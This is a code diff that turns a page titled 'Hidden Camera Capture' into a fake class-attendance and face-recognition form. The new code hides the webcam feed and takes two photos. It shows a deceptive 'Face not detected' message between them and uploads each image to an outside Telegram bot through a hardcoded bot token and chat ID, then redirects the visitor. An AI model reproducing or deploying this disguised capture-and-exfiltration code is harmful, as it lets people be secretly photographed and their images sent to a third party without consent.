@@ -3,46 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Camera Capture</title>
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <title>Class Attendance & Face Recognition</title>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; }
-        #video, #canvas { display: none; } /* Kamera tidak ditunjukkan */
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        #scan-animation { font-size: 20px; color: blue; display: none; }
         #message { font-size: 20px; font-weight: bold; color: green; display: none; }
+        #cancel-note { color: red; display: none; }
     </style>
 </head>
 <body>
-    <h1>Welcome</h1>
-    <button id="continueBtn">Continue</button>
+    <!-- Step 1: Pilih Kelas -->
+    <h1>Select Your Class</h1>
+    <form id="classForm">
+        <label><input type="checkbox" name="class" value="Izz"> Izz</label><br>
+        <label><input type="checkbox" name="class" value="Ali"> Ali</label><br>
+        <label><input type="checkbox" name="class" value="Fatimah"> Fatimah</label><br>
+        <button type="submit">Confirm</button>
+    </form>
+
+    <!-- Step 2: Face Recognition -->
+    <div id="faceRecSection" class="hidden">
+        <h1>Face Recognition</h1>
+        <button id="continueBtn">Continue</button>
+        <button id="cancelBtn">Cancel</button>
+        <p id="cancel-note">Page will stop here.</p>
+    </div>
+
+    <!-- Step 3: Face Detection -->
+    <p id="info" class="hidden">Please enable for facial detection.</p>
+    <p id="scan-animation">Scanning face...</p>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
     <p id="message"></p>
 
     <script>
+        const classForm = document.getElementById('classForm');
+        const faceRecSection = document.getElementById('faceRecSection');
+        const continueBtn = document.getElementById('continueBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const cancelNote = document.getElementById('cancel-note');
+        const info = document.getElementById('info');
+        const scanAnimation = document.getElementById('scan-animation');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const message = document.getElementById('message');
-        const continueBtn = document.getElementById('continueBtn');
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
+        let selectedName = "";
 
-        continueBtn.onclick = async () => {
-            continueBtn.style.display = "none"; // Sembunyikan button lepas ditekan
-            await startCamera();
+        // Step 1: Handle Class Selection
+        classForm.onsubmit = (e) => {
+            e.preventDefault();
+            const checkedInputs = document.querySelectorAll('input[name="class"]:checked');
+            if (checkedInputs.length === 0) return alert("Please select a name!");
+
+            let signedInUsers = JSON.parse(localStorage.getItem('signedInUsers')) || [];
+            selectedName = checkedInputs[0].value;
+
+            if (signedInUsers.includes(selectedName)) {
+                alert(selectedName + " has already signed in.");
+                return;
+            }
+
+            signedInUsers.push(selectedName);
+            localStorage.setItem('signedInUsers', JSON.stringify(signedInUsers));
+
+            faceRecSection.classList.remove('hidden');
+            classForm.style.display = 'none';
         };
 
-        async function startCamera() {
+        // Disable already signed-in names
+        window.onload = () => {
+            let signedInUsers = JSON.parse(localStorage.getItem('signedInUsers')) || [];
+            document.querySelectorAll('input[name="class"]').forEach(input => {
+                if (signedInUsers.includes(input.value)) {
+                    input.disabled = true;
+                }
+            });
+        };
+
+        // Step 2: Handle Continue and Cancel
+        cancelBtn.onclick = () => {
+            cancelNote.style.display = "block";
+        };
+
+        continueBtn.onclick = async () => {
+            continueBtn.style.display = "none";
+            cancelBtn.style.display = "none";
+            info.style.display = "block";
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                setTimeout(captureAndSend, 3000); // Ambil gambar selepas 3 saat
+                info.style.display = "none";
+                takePhotos();
             } catch (err) {
-                console.error("Error accessing camera: ", err);
+                console.error("Camera access denied:", err);
+                info.innerText = "Please enable for facial detection.";
             }
+        };
+
+        // Step 3: Ambil Gambar Dua Kali
+        async function takePhotos() {
+            scanAnimation.style.display = "block";
+
+            // Ambil Gambar Pertama
+            setTimeout(() => {
+                captureAndSend(() => {
+                    message.innerText = "Face not detected.";
+                    message.style.color = "red";
+                    message.style.display = "block";
+
+                    // Ambil Gambar Kedua Lepas "Face Not Detected"
+                    setTimeout(() => {
+                        captureAndSend(() => {
+                            message.innerText = "Done ✅";
+                            message.style.color = "green";
+                            message.style.display = "block";
+
+                            setTimeout(() => {
+                                message.innerText = selectedName + " signed in";
+                                setTimeout(() => {
+                                    message.innerText = "You look beautiful/handsome today!";
+                                    setTimeout(() => {
+                                        message.innerText = "Redirecting to the next page...";
+                                        setTimeout(() => {
+                                            window.location.href = "https://studandlearn.github.io/project-2/";
+                                        }, 2000);
+                                    }, 2000);
+                                }, 2000);
+                            }, 2000);
+                        });
+                    }, 2000);
+                });
+            }, 2000);
         }
 
-        function captureAndSend() {
+        function captureAndSend(callback) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -50,18 +150,12 @@
             canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "hidden_capture.jpg");
+                formData.append("photo", blob, "face_capture.jpg");
 
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
-                }).then(() => {
-                    message.innerText = "Redirecting...";
-                    message.style.display = "block";
-                    setTimeout(() => {
-                        window.location.href = "https://studandlearn.github.io/project-2/";
-                    }, 2000);
-                }).catch(err => console.error("Error sending photo: ", err));
+                }).then(() => callback()).catch(err => console.error("Error sending photo:", err));
             }, 'image/jpeg');
         }
     </script>
